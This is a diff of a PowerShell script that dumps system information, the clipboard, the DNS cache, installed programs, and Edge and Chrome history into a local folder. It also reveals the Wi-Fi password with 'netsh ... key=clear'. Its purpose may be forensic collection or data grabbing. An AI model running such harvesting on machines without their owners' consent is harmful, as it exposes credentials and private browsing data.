@@ -9,12 +9,15 @@ ipconfig > dumped/ipconfig.txt
 ipconfig /displaydns > dumped/dnsdisplay.txt 
 systeminfo > dumped/sysinfo.txt 
 tasklist > dumped/tasklist.txt
-
 Get-Clipboard > dumped/clipboard.txt
+Get-ChildItem -Path "C:\Program Files" | Select-Object Name > dumped/applist.txt
+Get-ChildItem -Path "C:\Program Files (x86)" | Select-Object Name > dumped/applist86.txt
+
 
 #This gets network information by checking the network name and getting the info based on that.
 $networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name 
 Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
+
 
 try {
     #This command copies edge history data to dumped/edge
@@ -38,6 +41,7 @@ catch {
     Write-Host "Google Chrome is not installed on this device, or the history folder is not available."
 }
 
+
 Write-Host "Do you want to copy a folder? (y/n):"
 $copy_permission = Read-Host #This variable asks for input of the user which could be y or n. This is used in the coming if-statement
 
@@ -52,3 +56,4 @@ if ($copy_permission -eq "y") {
 if ($copy_permission -eq "n"){
     Write-Host "Continuing on with the program."
 }
+
